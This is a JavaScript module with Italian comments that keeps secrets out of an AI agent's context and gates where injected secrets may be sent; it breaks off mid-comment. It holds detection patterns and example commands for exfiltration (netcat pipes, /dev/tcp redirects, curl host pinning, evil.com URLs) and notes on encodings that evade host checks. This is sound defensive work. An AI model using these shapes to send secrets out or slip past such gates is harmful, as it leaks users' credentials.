/**
 * sealed-secrets — registry SIGILLATO + reference-injection + SINK-GATING (F-harness, node-pure, testabile).
 *
 * Pattern "secret-reference / sealed-secret": il VALORE del segreto non entra MAI nel context del modello.
 * Il modello vede solo nome+descrizione (listSecretsMeta), usa un riferimento `{{secret:NAME}}`, e l'harness
 * sostituisce il valore reale SOLO al confine del tool (injectSecrets) e SOLO verso sink consentiti (checkSink).
 * Difesa stratificata: provisioning out-of-band (env/CLI, mai dal modello) · valore-mai-in-context ·
 * sink-gating (vs exfiltration-via-use) · egress-redaction backstop (il valore è registrato in secrets-registry
 * così ogni output che lo contenesse viene comunque redatto).
 *
 * Design: ../../wiki/concepts/sealed-secrets.md. Idea utente 2026-06-30 (msg 577/578/579).
 */
import { SECRET_PATTERNS } from "./secrets-redact.mjs";
import { registerEgressRaw } from "./secrets-registry.mjs";
import { createHash } from "node:crypto";

/** Fingerprint NON-reversibile (sha256 troncato + lunghezza): per verificare l'IDENTITÀ di un secret senza vederne il
 * valore (idea utente: "verificare se un segreto è inserito correttamente"). Non espone alcun carattere del valore. */
function fingerprint(value) {
  return `sha256:${createHash("sha256").update(String(value)).digest("hex").slice(0, 10)}/len:${String(value).length}`;
}

/** Registry sigillato: name → { value, description, allowedSinks[] }. In-memory, MAI su disco in chiaro. */
const SEALED = new Map();
const MAX_SEALED = 256;
const NAME_RE = /^[A-Za-z0-9_.\-]{1,64}$/;
const SECRET_REF = /\{\{secret:([A-Za-z0-9_.\-]+)\}\}/g; // riferimento usato dal modello negli args
const MAX_DESC_LEN = 256;

/** Sanitizza una description CONTROLLATA-DAL-MODELLO (review security 2026-06-30 P2-1): la description finisce
 * verbatim nel dialog di consenso (Ask) e in listSecretsMeta → newline/glifi potrebbero forgiare righe-diff o
 * spingere fuori vista la riga ⚠ del widening (UI redress). Strip dei control-char (incl. newline) + cap lunghezza. */
function sanitizeDescription(d) {
  return String(d ?? "").replace(/[\r\n\t\f\v\0]/g, " ").slice(0, MAX_DESC_LEN);
}

/**
 * Registra/aggiorna un sealed-secret. Il valore NON è mai esposto da listSecretsMeta. Di default lo registra anche
 * in secrets-registry (egress-redaction backstop). `redactEgress` (default true):
 *   - true  → il valore entra nel Set di egress → INVARIANTE 'ogni sealed-value è redigibile' (review P1): un valore
 *             corto/poco-vario eco-ato in un output viene comunque redatto (no leak provider/transcript).
 *   - false → opt-out per i secret CORTI/poco-entropici (OTP, PIN, una data: utente msg 603): redigerli globalmente
 *             corromperebbe ogni output che contiene quella stringa (RUMORE). Il secret resta SIGILLATO e iniettabile,
 *             ma NON è aggiunto al backstop → trade-off esplicito (accettabile per un OTP usa-e-getta).
 * @returns {{ok:boolean, name?:string, reason?:string, warn?:string}}
 */
export function setSecret(name, value, { description = "", allowedSinks = [], redactEgress = true, allowLocalHttp = false } = {}) {
  if (typeof name !== "string" || !NAME_RE.test(name)) return { ok: false, reason: "nome non valido (usa [A-Za-z0-9_.-], max 64)" };
  if (typeof value !== "string" || value.length < 1) return { ok: false, reason: "valore vuoto" };
  if (!SEALED.has(name) && SEALED.size >= MAX_SEALED) return { ok: false, reason: `registry pieno (max ${MAX_SEALED})` };
  const sinks = Array.isArray(allowedSinks) ? [...new Set(allowedSinks.map((s) => String(s).toLowerCase().trim()).filter(Boolean))] : [];
  const redact = redactEgress !== false;
  let warn;
  if (redact) {
    if (!registerEgressRaw(value)) return { ok: false, reason: "valore non registrabile per la redazione (egress pieno)" };
  } else {
    warn = `'${name}': redactEgress=false → il valore NON sarà redatto dagli output (scelta per evitare rumore su OTP/short; non eco-arlo in chiaro)`;
  }
  SEALED.set(name, { value, description: sanitizeDescription(description), allowedSinks: sinks, redactEgress: redact, allowLocalHttp: allowLocalHttp === true, fingerprint: fingerprint(value) });
  return warn ? { ok: true, name, warn } : { ok: true, name };
}

/**
 * setAllowLocalHttp — abilita/disabilita il flag `allowLocalHttp` di un secret ESISTENTE (utente msg 668). Il secret
 * diventa usabile su `http://` MA SOLO verso loopback letterale (vedi checkSink). Va chiamata SOLO dopo consenso
 * ESPLICITO dell'utente (Ask della TUI o provisioning out-of-band), MAI per auto-decisione del modello.
 * @returns {{ok:boolean, name?:string, allowLocalHttp?:boolean, reason?:string}}
 */
export function setAllowLocalHttp(name, allow = true) {
  const s = SEALED.get(name);
  if (!s) return { ok: false, reason: "secret does not exist" };
  s.allowLocalHttp = allow === true; // solo true abilita (coerente con setSecret; no truthiness sorprese)
  return { ok: true, name, allowLocalHttp: s.allowLocalHttp };
}

// ───────────────────────── LIFECYCLE in-sessione (utente msg 708/713/715/718, 2026-06-30) ─────────────────────────
// Primitive per gestire un secret SENZA CLI né re-paste: grant-sink / rinomina / rimuovi / edit. Sono SOLO MECCANISMO
// (F-harness): il CONSENSO (Ask con diff) lo impone l'estensione (secrets-guardrail), MAI auto-deciso dal modello —
// stesso pattern di setAllowLocalHttp/request_local_http. Design: ../../wiki/concepts/sealed-secrets.md §4ter.

/** Un host accettabile in allowedSinks: dominio/IP DNS-shape, loopback letterale, o '*' (wildcard). Rifiuta
 * scheme://, path, porta, userinfo, spazi. (hostMatches/extractHosts lavorano già su questa shape.) */
export function isValidSinkHost(host) {
  const h = String(host ?? "").toLowerCase().trim();
  if (h === "*") return true;
  // review P3: rifiuta host degeneri (leading/trailing dot: '.com', 'x.com.') → suffix-match asimmetrico/footgun.
  if (h.startsWith(".") || h.endsWith(".")) return false;
  return h.length > 0 && h.length <= 253 && /^[a-z0-9.\-]+$/.test(h);
}

/** Aggiunge un host agli allowedSinks di un secret esistente (GRANT-SINK in-sessione). WIDENING → l'estensione lo gate
 * con un Ask ad alta frizione. @returns {{ok, name?, allowedSinks?, added?, reason?}} */
export function addAllowedSink(name, host) {
  const s = SEALED.get(name);
  if (!s) return { ok: false, reason: "secret does not exist" };
  const h = String(host ?? "").toLowerCase().trim();
  if (!isValidSinkHost(h)) return { ok: false, reason: `invalid sink host '${host}' (use a domain/IP/'*' — no scheme/path/port)` };
  if (s.allowedSinks.includes(h)) return { ok: true, name, allowedSinks: s.allowedSinks, added: false };
  s.allowedSinks = [...s.allowedSinks, h];
  return { ok: true, name, allowedSinks: s.allowedSinks, added: true };
}

/** Rimuove un host dagli allowedSinks (NARROWING). @returns {{ok, name?, allowedSinks?, removed?, reason?}} */
export function removeAllowedSink(name, host) {
  const s = SEALED.get(name);
  if (!s) return { ok: false, reason: "secret does not exist" };
  const h = String(host ?? "").toLowerCase().trim();
  const before = s.allowedSinks.length;
  s.allowedSinks = s.allowedSinks.filter((x) => x !== h);
  return { ok: true, name, allowedSinks: s.allowedSinks, removed: s.allowedSinks.length < before };
}

/** Aggiorna la descrizione (BENIGN). @returns {{ok, name?, description?, reason?}} */
export function setSecretDescription(name, description) {
  const s = SEALED.get(name);
  if (!s) return { ok: false, reason: "secret does not exist" };
  s.description = sanitizeDescription(description); // strip control-char + cap (anti UI-redress nel dialog di consenso)
  return { ok: true, name, description: s.description };
}

/** Rinomina un secret mantenendo valore + metadata (il VALORE non si ri-espone, no re-paste). Promozione
 * INGRESS_N→nome-esplicito = questa. @returns {{ok, name?, renamed?, from?, reason?}} */
export function renameSecret(oldName, newName) {
  const s = SEALED.get(oldName);
  if (!s) return { ok: false, reason: "secret does not exist" };
  if (typeof newName !== "string" || !NAME_RE.test(newName)) return { ok: false, reason: "invalid new name (use [A-Za-z0-9_.-], max 64)" };
  if (newName === oldName) return { ok: true, name: newName, renamed: false };
  if (SEALED.has(newName)) return { ok: false, reason: `a secret named '${newName}' already exists` };
  SEALED.delete(oldName);
  SEALED.set(newName, s);
  return { ok: true, name: newName, renamed: true, from: oldName };
}

/** Distrugge un secret (distruzione PREVIA Ask, imposta dall'estensione). NB: il valore resta nel registry di
 * egress-redaction (backstop conservativo: continua a redarre eventuali echi residui) — non si de-registra, nessun
 * leak. @returns {{ok, name?, removed?, reason?}} */
export function removeSecret(name) {
  if (!SEALED.has(name)) return { ok: false, reason: "secret does not exist" };
  SEALED.delete(name);
  return { ok: true, name, removed: true };
}

/**
 * computeSecretEditDiff — diff prima→dopo di una proposta di modifica + classifica ogni cambiamento come 'widening'
 * (allarga reach/leak → Ask alta-frizione + warning) o benigno. NON muta nulla. È il cuore "visivamente chiaro" +
 * "frizione proporzionale al rischio". changes: { rename?, addSinks?:string[], removeSinks?:string[], description?,
 * allowLocalHttp?:boolean }. @returns {{exists, name?, changes?:{field,before,after,widening,note?}[], anyWidening?, externalSinks?:string[]}}
 */
export function computeSecretEditDiff(name, changes = {}) {
  const s = SEALED.get(name);
  if (!s) return { exists: false };
  const out = [];
  const externalSinks = [];
  let anyInvalid = false; // review 2026-06-30 (drift diff↔apply): segnala i change che applySecretEdit RIFIUTEREBBE
  // rename — valida NAME_RE + collisione (il diff DEVE riflettere ciò che apply farà davvero)
  if (typeof changes.rename === "string" && changes.rename !== name) {
    const bad = !NAME_RE.test(changes.rename) ? "invalid name (use [A-Za-z0-9_.-], max 64)"
      : SEALED.has(changes.rename) ? "a secret with this name already exists" : null;
    if (bad) anyInvalid = true;
    out.push({ field: "name", before: name, after: changes.rename, widening: false, ...(bad ? { note: `CANNOT: ${bad}`, invalid: true } : {}) });
  }
  // addSinks — dedup nel batch + valida (host invalidi = riga INVALID, non appliabile) + UNA riga additiva (lista finale)
  if (Array.isArray(changes.addSinks)) {
    const seen = new Set();
    const newHosts = [];
    for (const raw of changes.addSinks) {
      const h = String(raw ?? "").toLowerCase().trim();
      if (!h || seen.has(h)) continue; // dedup nel batch (apply aggiunge una volta sola)
      seen.add(h);
      if (!isValidSinkHost(h)) { anyInvalid = true; out.push({ field: "allowedSinks", before: "(invalid)", after: h, widening: false, note: "CANNOT: invalid host (use domain/IP/'*', no scheme/path/port)", invalid: true }); continue; }
      if (s.allowedSinks.includes(h)) continue; // già presente → no-op (niente riga: il diff == lo stato finale)
      newHosts.push(h);
      if (h === "*" || !isLoopbackLiteral(h)) externalSinks.push(h);
    }
    if (newHosts.length) {
      const after = [...s.allowedSinks, ...newHosts];
      const ext = newHosts.filter((h) => h === "*" || !isLoopbackLiteral(h));
      // UNA riga, stato COMPLETO prima→dopo (review F5: il per-host before=lista/after=singolo sembrava sostituzione)
      out.push({ field: "allowedSinks", before: s.allowedSinks.join(", ") || "(none)", after: after.join(", "), widening: true,
        note: ext.includes("*") ? "adds wildcard '*' = ANY host (MAX widening)" : ext.length ? `adds external host(s): ${ext.join(", ")}` : "adds loopback host(s)" });
    }
  }
  // removeSinks — UNA riga additiva (narrowing)
  if (Array.isArray(changes.removeSinks)) {
    const rm = [];
    for (const raw of changes.removeSinks) { const h = String(raw ?? "").toLowerCase().trim(); if (s.allowedSinks.includes(h) && !rm.includes(h)) rm.push(h); }
    if (rm.length) out.push({ field: "allowedSinks", before: s.allowedSinks.join(", ") || "(none)", after: s.allowedSinks.filter((x) => !rm.includes(x)).join(", ") || "(none)", widening: false, note: `narrowing (removes ${rm.join(", ")})` });
  }
  if (typeof changes.description === "string") {
    const newDesc = sanitizeDescription(changes.description);
    if (newDesc !== s.description) out.push({ field: "description", before: s.description || "(none)", after: newDesc || "(none)", widening: false });
  }
  if (typeof changes.allowLocalHttp === "boolean" && changes.allowLocalHttp !== (s.allowLocalHttp === true)) {
    out.push({ field: "allowLocalHttp", before: String(s.allowLocalHttp === true), after: String(changes.allowLocalHttp), widening: changes.allowLocalHttp === true, note: changes.allowLocalHttp ? "enables http→loopback (session-wide, ANY local service)" : "narrowing" });
  }
  return { exists: true, name, changes: out, anyWidening: out.some((c) => c.widening), anyInvalid, externalSinks };
}

/**
 * applySecretEdit — applica le modifiche (DOPO l'Ask di consenso, lo garantisce l'estensione). Ordine: sink/desc/flag
 * sul nome CORRENTE, poi rename per ultimo (cambia la chiave). Fail-closed: se un passo fallisce, ritorna l'errore con
 * ciò che era già applicato. @returns {{ok, name?, applied?:string[], reason?}} */
export function applySecretEdit(name, changes = {}) {
  if (!SEALED.has(name)) return { ok: false, reason: "secret does not exist" };
  // ATOMICITÀ (review 2026-06-30 P1 drift): pre-valida TUTTO ciò che potrebbe fallire PRIMA di mutare — così lo
  // stato finale == il diff che l'utente ha approvato (niente partial-apply post-conferma). Gli unici step fallibili
  // sono rename (NAME_RE+collisione) e addSinks (isValidSinkHost); gli altri non falliscono.
  if (typeof changes.rename === "string" && changes.rename !== name) {
    if (!NAME_RE.test(changes.rename)) return { ok: false, reason: "invalid new name (use [A-Za-z0-9_.-], max 64)" };
    if (SEALED.has(changes.rename)) return { ok: false, reason: `a secret named '${changes.rename}' already exists` };
  }
  if (Array.isArray(changes.addSinks)) {
    for (const raw of changes.addSinks) { const h = String(raw ?? "").toLowerCase().trim(); if (h && !isValidSinkHost(h)) return { ok: false, reason: `invalid sink host '${raw}' (use domain/IP/'*', no scheme/path/port)` }; }
  }
  // tutto valido → applica (nessuno di questi step può più fallire). Ordine: sink/desc/flag sul nome corrente, rename per ultimo.
  const applied = [];
  if (Array.isArray(changes.addSinks)) {
    for (const h of changes.addSinks) { const r = addAllowedSink(name, h); if (r.ok && r.added) applied.push(`+sink ${String(h).toLowerCase().trim()}`); }
  }
  if (Array.isArray(changes.removeSinks)) {
    for (const h of changes.removeSinks) { const r = removeAllowedSink(name, h); if (r.removed) applied.push(`-sink ${String(h).toLowerCase().trim()}`); }
  }
  if (typeof changes.description === "string") { setSecretDescription(name, changes.description); applied.push("description"); }
  if (typeof changes.allowLocalHttp === "boolean") { setAllowLocalHttp(name, changes.allowLocalHttp); applied.push(`allowLocalHttp=${changes.allowLocalHttp}`); }
  let finalName = name;
  if (typeof changes.rename === "string" && changes.rename !== name) { renameSecret(name, changes.rename); finalName = changes.rename; applied.push(`renamed→${finalName}`); }
  return { ok: true, name: finalName, applied };
}

/**
 * validateSecretRefs — VALIDATORE proattivo ("LSP-like", idea utente msg 713) dei riferimenti {{secret:NAME}} in un
 * testo: per ogni ref controlla se il secret ESISTE; se no, suggerisce il nome esistente più vicino (edit-distance).
 * NON muta, NON inietta. Fa scoprire un typo/nome-inventato PRIMA del tool_call (FIND-4). @returns
 *   {{ok:boolean, refs:{name,exists,suggestion?}[], unknown:string[]}}
 */
export function validateSecretRefs(text) {
  const t = String(text ?? "");
  const names = referencedSecrets(t); // SOLO i ref ben-formati {{secret:NAME}}
  const existing = [...SEALED.keys()];
  const refs = names.map((n) => {
    if (SEALED.has(n)) return { name: n, exists: true };
    const suggestion = closestName(n, existing);
    return suggestion ? { name: n, exists: false, suggestion } : { name: n, exists: false };
  });
  // ref MALFORMATI (review P2-4): `{{secret:FOO BAR}}` (spazio) / `{{secret:}}` (vuoto) NON matchano SECRET_REF →
  // sfuggivano silenziosamente (il validatore diceva ok:true) e poi uscivano letterali. Catturali con un pattern lasco
  // e segnalali, così il modello li corregge PRIMA del tool_call (è lo scopo del validatore, FIND-4).
  const wellFormed = new Set(t.match(SECRET_REF) || []);
  const loose = /\{\{\s*secret\s*:[^}]*\}\}/gi;
  let m;
  while ((m = loose.exec(t))) {
    if (!wellFormed.has(m[0])) refs.push({ name: m[0], exists: false, malformed: true });
  }
  return { ok: refs.every((r) => r.exists), refs, unknown: refs.filter((r) => !r.exists).map((r) => r.name) };
}

/** Nome candidato più vicino per edit-distance (suggerisce solo se ragionevolmente vicino, anti-nonsense). */
function closestName(target, candidates) {
  const t = String(target).toLowerCase();
  let best = null, bestD = Infinity;
  for (const c of candidates) {
    const d = levenshtein(t, c.toLowerCase());
    if (d < bestD) { bestD = d; best = c; }
  }
  if (!best) return null;
  // soglia anti-nonsense (review P2-3): per nomi CORTI (≤4) il budget è 1 — evita di suggerire "XY" per "AB"
  // (il vecchio floor costante 2 le rendeva equivalenti); per nomi lunghi ~40% della lunghezza.
  const budget = Math.max(t.length, best.length) <= 4 ? 1 : Math.max(2, Math.ceil(Math.max(t.length, best.length) * 0.4));
  return bestD <= budget ? best : null;
}

/** Distanza di Levenshtein (due-righe, O(n) memoria). */
function levenshtein(a, b) {
  const m = a.length, n = b.length;
  if (!m) return n; if (!n) return m;
  let prev = Array.from({ length: n + 1 }, (_, i) => i);
  for (let i = 1; i <= m; i++) {
    const cur = [i];
    for (let j = 1; j <= n; j++) cur[j] = Math.min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    prev = cur;
  }
  return prev[n];
}

/** Vista per il MODELLO: nome + descrizione + allowedSinks + allowLocalHttp, MAI il valore. */
export function listSecretsMeta() {
  return [...SEALED.entries()].map(([name, s]) => ({ name, description: s.description, allowedSinks: s.allowedSinks, allowLocalHttp: s.allowLocalHttp === true, fingerprint: s.fingerprint }));
}

/** Esiste un sealed-secret con questo nome? */
export function hasSecret(name) {
  return SEALED.has(name);
}

/** INTERNO — il valore reale (per la sola sostituzione). NON esporre al modello. */
function valueOf(name) {
  return SEALED.get(name)?.value ?? null;
}

/** I nomi-secret `{{secret:NAME}}` referenziati in un testo (unici). */
export function referencedSecrets(text) {
  const out = new Set();
  let m;
  SECRET_REF.lastIndex = 0;
  while ((m = SECRET_REF.exec(String(text ?? "")))) out.add(m[1]);
  return [...out];
}

/**
 * Host (lowercase, senza userinfo/porta) dei URL in un testo di operazione. SECURITY (review P0): la cattura TERMINA
 * l'authority anche su `?` `#` `\` (RFC 3986) — altrimenti `https://evil.com#.openai.com` darebbe host
 * `evil.com#.openai.com` che fa suffix-match con `.openai.com` mentre il client si connette a evil.com (spoof). +
 * fail-closed: un host con caratteri NON-DNS residui viene SCARTATO (→ conta come host-non-identificabile → blocco).
 */
export function extractHosts(opText) {
  const out = new Set();
  const re = /\b[a-z][a-z0-9+.\-]*:\/\/([^/\s'"`)?#\\]+)/gi;
  let m;
  while ((m = re.exec(String(opText ?? "")))) {
    let h = m[1];
    const at = h.lastIndexOf("@"); if (at >= 0) h = h.slice(at + 1); // toglie user:pass@
    h = h.split(":")[0].toLowerCase(); // toglie :porta
    if (h && /^[a-z0-9.\-]+$/.test(h)) out.add(h); // SOLO host DNS-valido (scarta residui sporchi → fail-closed)
  }
  return [...out];
}

/** L'operazione usa flag che disaccoppiano l'host-URL dalla destinazione REALE (curl --resolve/--connect-to/proxy,
 * header Host: ridefinito)? In quel caso l'allow-host non è più verificabile → fail-closed. (review P2 host-pinning) */
export function hasHostPinning(opText) {
  const t = String(opText ?? "");
  return /(^|\s)(--resolve|--connect-to|--interface)(\s|=)/.test(t) ||
    // NB: i flag curl sono CASE-SENSITIVE → niente `/i` qui, altrimenti `-X` (--request POST/PUT/...) matcherebbe `-x`
    // (--proxy) e bloccherebbe ogni POST legittimo (bug trovato nel test live 2026-06-30: allowLocalHttp rotto su -X).
    /(^|\s)(-x|--proxy[0-9a-z-]*)(\s|=)/.test(t) ||
    /-H\s*['"]?\s*host\s*:/i.test(t); // l'header `Host:` resta case-insensitive (i nomi-header HTTP lo sono)
}

/** Il testo dell'operazione SCRIVE il segreto su file / lo esfiltra in modo evidente (deny-shapes)? */
export function hasFileOrPipeExfil(opText) {
  const t = String(opText ?? "");
  // redirezione a file (> >>), tee, pipe verso netcat/sendmail/mail — shape esfiltranti comuni.
  return /(^|\s)(>>?|\|\s*tee\b|\btee\b)\s*\S/.test(t) || /\|\s*(nc|ncat|netcat|sendmail|mail)\b/.test(t);
}

/** L'operazione invia verso un URL `http://` in CHIARO (non-TLS)? Un sealed-secret non deve transitare in plaintext. */
export function hasInsecureHttp(opText) {
  return /\bhttp:\/\//i.test(String(opText ?? ""));
}

/**
 * L'operazione COMPONE più comandi / sostituzioni (≠ singola richiesta a un solo URL)? Usato SOLO dal fast-path
 * `allowLocalHttp` (review-loop 2026-06-30, P0): una deny-shape come `https-only` perde contro la composizione
 * (`curl http://localhost ; nc evil.com`, `1>/dev/tcp/evil.com/80`, `$(...)`), quindi il fast-path consente SOLO una
 * shape PULITA (un comando, un URL) e qualunque segnale di composizione lo invalida → si ricade sul blocco normale.
 * Segnali: separatori/chaining/background, pipe, sostituzioni `$()`/`<()`, bash net-redirect `/dev/tcp|udp`, newline
 * (anche dal join multi-arg di injectIntoStrings → uno split-view tra argomenti). NB: `&` di una URL-query
 * (`?a=1&b=2`) NON conta (richiede whitespace/boundary attorno) per non bloccare URL legittimi con parametri.
 */
export function hasCommandComposition(opText) {
  const t = String(opText ?? "");
  // separatori-di-comando + whitespace-di-CONTROLLO (TAB/CR/VT/FF/NUL): NON lo SPACE (0x20) — rompe ogni comando —
  // ma gli altri whitespace sono anomali in un comando legittimo e servono a obfuscare operandi (review-loop #2 2026-06-30).
  if (/[\n\r\t\f\v\0;`|]/.test(t)) return true;              // newline/CR/TAB/VT/FF/NUL · ; · backtick · pipe (incl. ||)
  // && + backgrounding & ANCHE non-spaziato (`localhost& whoami`, review code-reviewer P1-a) — ma NON `&param` di URL
  // (in `?a=1&b=2` la `&` è seguita da un carattere, non da spazio/fine).
  if (/&&/.test(t) || /(^|[^&])&(\s|$)/.test(t)) return true;
  if (/\$\(|<\(/.test(t)) return true;                       // $(...) · <(...)
  if (/\/dev\/(tcp|udp)\b/i.test(t)) return true;            // bash network redirect (esfil senza nc)
  return false;
}

/**
 * L'operazione contiene un OPERANDO-HOST "estraneo" (non-loopback)? Guardia STRUTTURALE del fast-path allowLocalHttp
 * (review-loop #2/#3 2026-06-30 + security-review: P0 bare-operand). CAUSA-RADICE: `extractHosts` vede solo gli host
 * `scheme://`, ma `curl`/`wget` accettano operandi SENZA schema in OGNI codifica IP (dominio, IPv4, dotted-numerico
 * corto `8.8`→8.0.0.8, decimale `2130706433`, hex `0x..`, IPv6 `[..]`) e vi applicano `-H Authorization:` → leak
 * esterno (verificato con curl reale). Invece di RINCORRERE le codifiche con regex (denylist incompleto), NORMALIZZIAMO
 * ogni candidato-host come fa curl, via `new URL("http://"+tok).hostname` (parser WHATWG = stessa espansione IPv4 di
 * curl), e pretendiamo che il risultato sia loopback. Pre-pass: togliamo le stringhe QUOTATE (header/body legittimi:
 * un host citato lì non è un operando) e gli URL `scheme://` (host già verificato da extractHosts).
 * Il NORMALIZZATORE è l'arbitro: NON pre-filtriamo "sembra un host?" col punto ASCII (lo fa anche `%2e`/dot-unicode
 * `。．｡` che `new URL`+curl decodificano → bypassavano il gate, review security 4° giro). Saltiamo SOLO i flag e i
 * numeri PICCOLI (flag-value tipo `--max-time 30`), normalizziamo TUTTO il resto, e marchiamo estraneo se l'hostname
 * CANONICO è host-shaped (ha un `.` o è IPv6 `[..]`) e NON loopback. Un single-label (`myagent`, `myserver`) → hostname
 * senza punto → NON host-shaped → non marcato (no falso-blocco di `-A myagent`; residuo accettato: single-label esterno
 * serve DNS-locale attaccante = contrived). `new URL` che lancia (es. `-H Accept:application/json` non-quotato) → SKIP
 * (non è un host risolvibile → curl non lo raggiunge esterno; evita falso-blocco). RESIDUI fail-safe doc in §4bis.
 */
export function hasForeignHostToken(opText) {
  let t = String(opText ?? "");
  t = t.replace(/'[^']*'/g, " ").replace(/"[^"]*"/g, " ");          // togli stringhe quotate (body/header)
  t = t.replace(/\b[a-z][a-z0-9+.\-]*:\/\/[^\s'"`]+/gi, " ");       // togli URL scheme:// per intero
  for (const raw of t.split(/\s+/)) {
    if (!raw || raw.startsWith("-")) continue;                      // flag → ok
    const tok = raw.replace(/[)(;,'"`]+$/g, "");                    // togli punteggiatura di coda
    if (!tok || /^\d{1,6}$/.test(tok)) continue;                    // numero piccolo = flag-value (--max-time 30) → no normalizzare
    let hostname;
    try { hostname = new URL("http://" + tok).hostname; } catch { continue; } // non parsabile come host → curl non lo risolve esterno
    const h = hostname.replace(/^\[|\]$/g, "");                     // togli [] IPv6 prima del check loopback
    // host-shaped (ha un `.` o è IPv6) e NON loopback → operando estraneo. `new URL` ha già decodificato %2e/dot-unicode.
    if ((hostname.includes(".") || hostname.startsWith("[")) && !isLoopbackLiteral(h)) return true;
  }
  return false;
}

/**
 * isLoopbackLiteral — `host` è un loopback LETTERALE (127.0.0.0/8, `localhost`, `::1`)? Usato dal fast-path
 * `allowLocalHttp`: http è consentito SOLO verso loopback, e SOLO su host LETTERALE (non hostname arbitrari) per non
 * dipendere dalla risoluzione DNS (anti DNS-rebinding). NB: `localhost` è incluso per ergonomia dev; un /etc/hosts
 * sabotato potrebbe rimapparlo (rischio residuo accettato: è la macchina dell'utente). IPv6 in URL `http://[::1]`:
 * extractHosts non estrae le parentesi → usa 127.0.0.1/localhost (limite noto).
 */
export function isLoopbackLiteral(host) {
  const h = String(host ?? "").toLowerCase().trim();
  if (h === "localhost" || h === "::1") return true;
  const m = h.match(/^127\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  return !!m && m.slice(1).every((o) => Number(o) >= 0 && Number(o) <= 255);
}

/**
 * checkSink — sink-gating per UN secret verso l'operazione `opText`. Modi:
 *   - 'strict' (default): allow-host fail-closed. Se il secret dichiara allowedSinks → consenti SOLO se TUTTI gli
 *     host del comando sono in allow-list (e nessuna scrittura-file). Se NON dichiara allowedSinks → BLOCCA ogni
 *     sink di rete o scrittura-file (il secret è usabile solo in op locali senza vettore d'uscita verificabile).
 *   - 'warn': come strict ma i blocchi-da-deny-list (secret senza allow-list) diventano warning (consentito).
 *   - 'off': nessun gating.
 * @returns {{allowed:boolean, reason?:string, warn?:string}}
 */
export function checkSink(name, opText, mode = "strict") {
  const s = SEALED.get(name);
  if (!s) return { allowed: false, reason: "secret does not exist" };
  if (mode === "off") return { allowed: true };
  const hosts = extractHosts(opText);
  const fileExfil = hasFileOrPipeExfil(opText);
  const hostPinned = hasHostPinning(opText);
  // FAST-PATH allowLocalHttp (utente msg 668) — è una deroga RISTRETTA e CONSENSO-GATED, NON la tesi "loopback è
  // sicuro" (review-loop 2026-06-30, H2/P0): un comando composto o un relay/redirect locale può ANCORA muovere il
  // valore (= exfil-via-use, de-prioritizzata). Ciò che rende la deroga accettabile è il consenso ESPLICITO
  // dell'utente (request_local_http/CLI), non la natura del loopback. Per non riaprire l'exfil-FACILE la concediamo
  // SOLO a una shape PULITA — tutte necessarie: (a) opt-in attivo; (b) ≥1 host e (c) OGNI host loopback letterale;
  // (d) niente scrittura-file; (e) niente host-pinning (CRITICO: `--resolve`/proxy rimapperebbero "localhost" su un IP
  // esterno); (f) UN SOLO URL (countUrls su `://`, anti `2://evil.com` invisibile a extractHosts); (g) niente
  // composizione di comandi (`;`/`&&`/`|`/`$()`/newline = un secondo canale d'uscita). Concesso → bypassa https-only
  // E allowedSinks per QUEL solo comando-loopback (qualsiasi schema: anche https://localhost).
  const urlCount = (String(opText).match(/:\/\//g) || []).length;
  if (s.allowLocalHttp && hosts.length && hosts.every(isLoopbackLiteral)
      && !fileExfil && !hostPinned && urlCount === 1
      && !hasCommandComposition(opText) && !hasForeignHostToken(opText)) {
    // (g) niente token-host estraneo: chiude il bare-operand (`curl http://localhost evil.com` → evil.com = 2° URL).
    return { allowed: true };
  }
  // https-only: un sealed-secret NON transita su http:// in chiaro (vale in strict E warn: è igiene crittografica).
  if (hasInsecureHttp(opText)) {
    const loopbackHint = hosts.length && hosts.every(isLoopbackLiteral)
      ? " (loopback target: enable allowLocalHttp via request_local_http, and use a SINGLE clean command — no ';'/'|'/'&&')"
      : " (use https)";
    return { allowed: false, reason: `'${name}' cannot be sent over http:// in cleartext${loopbackHint}` };
  }

  if (s.allowedSinks.length) {
    // allow-host fail-closed (vale anche in 'warn': l'allow-list è una scelta esplicita dell'utente)
    if (fileExfil) return { allowed: false, reason: `'${name}' cannot be written to a file/pipe (write detected)` };
    if (hostPinned) return { allowed: false, reason: `'${name}': host-pinning detected (--resolve/--connect-to/proxy/Host:) → the real destination is not verifiable from the URL, blocked` };
    if (!hosts.length) return { allowed: false, reason: `'${name}' requires a destination among [${s.allowedSinks.join(", ")}] but no host is identifiable in the operation (fail-closed)` };
    const bad = hosts.filter((h) => !s.allowedSinks.some((a) => hostMatches(h, a)));
    if (bad.length) return { allowed: false, reason: `'${name}' allowed only toward [${s.allowedSinks.join(", ")}]; disallowed hosts: ${bad.join(", ")}` };
    return { allowed: true };
  }

  // secret SENZA allow-list dichiarata → deny-list conservativa
  const allLoopback = hosts.length && hosts.every(isLoopbackLiteral);
  const reason = fileExfil
    ? `'${name}' without allowedSinks: file/pipe write blocked`
    : hosts.length
      ? allLoopback
        // host loopback ma flag OFF (es. https://localhost): due rimedi possibili → li nomino entrambi (anti-cerimonia M4)
        ? `'${name}' without allowedSinks: blocked toward localhost. Either add the loopback host to allowedSinks, or (for http) enable allowLocalHttp via request_local_http.`
        : `'${name}' without allowedSinks: network send blocked (declare allowedSinks to use it toward a host)`
      : null;
  if (reason) {
    // review P2: in warn NON dire "blocked" (il valore VIENE inviato) — messaggio ONESTO che segnala l'egress.
    if (mode === "warn") return { allowed: true, warn: `'${name}' has no allowedSinks — WARN mode: the value is ALLOWED out (declare allowedSinks to gate it)` };
    return { allowed: false, reason };
  }
  return { allowed: true };
}

/** host == allow-pattern: match esatto o suffix-dominio (`api.x.com` ⊆ allow `x.com`); allow `*` = qualsiasi. */
function hostMatches(host, allow) {
  if (allow === "*") return true;
  if (host === allow) return true;
  return host.endsWith("." + allow);
}

/**
 * checkSinkTyped — sink-gating per UN secret verso una richiesta TIPIZZATA (URL stringa, non shell). È la variante
 * pulita-by-design del canale `http_request` (arch H2, ADR 2026-06-30): la destinazione è `new URL(url).hostname` —
 * NON serve `hasForeignHostToken`/`hasCommandComposition`/`hasFileOrPipeExfil`/`hasHostPinning` (non c'è shell da
 * disambiguare: niente composizione, niente bare-operand, niente redirect-flag). Regola, allineata a checkSink:
 *   - solo http/https; altri schemi → blocco.
 *   - https → allow-host fail-closed (allowedSinks); senza allowedSinks → blocco rete (warn-mode → consentito con warn).
